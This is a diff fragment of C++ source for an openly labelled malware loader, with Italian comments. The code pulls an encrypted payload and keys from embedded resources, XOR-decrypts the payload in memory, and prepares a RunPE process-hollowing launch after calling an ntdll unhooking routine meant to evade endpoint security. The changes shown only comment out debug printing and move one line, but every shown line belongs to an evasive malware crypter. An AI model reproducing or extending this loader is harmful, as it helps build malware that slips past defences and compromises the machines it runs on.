@@ -233,15 +233,16 @@ int main(){
     ROTkey = (int *)GetResource(422,"BIN", &ROTkeyLen);
     nAES = (int *)GetResource(123,"BIN", &nAESLen);
     nXOR = (int *)GetResource(124,"BIN", &nXORLen);
-
+    /*  
     for(int i = 0; i< 32; i++){
         printf("%x\n", AESkey[i]);
     }
+    */
     unsigned char* malware = new unsigned char[malwareLen]; //alloco memoria per il malware
     memcpy(malware, resourcePtr, malwareLen); //copio il malware nelle risorse nella memoria allocata per il malware
     printf("%d",malwareLen);
 
-
+    
     for(int i = 0; i < *nXOR; i++){
         XOR(malware,malwareLen,(char *)XORkey, 32);
     }
@@ -252,13 +253,14 @@ int main(){
 
 
     //ROT_decrypt(malware,malwareLen,*ROTkey);
-
-    void* pe = malware; // pe sara' il puntatore ai byte del nostro malware
+    /*
     for(int i = 0; i < 2000; i++){
         printf("%c", malware[i]);
     }
+    */
 
     //Adesso arriva la roba strana del RunPE
+    void* pe = malware; // pe sara' il puntatore ai byte del nostro malware
 
     printf("\nprima di ntdllUnhooking\n");
     ntdllUnhooking();
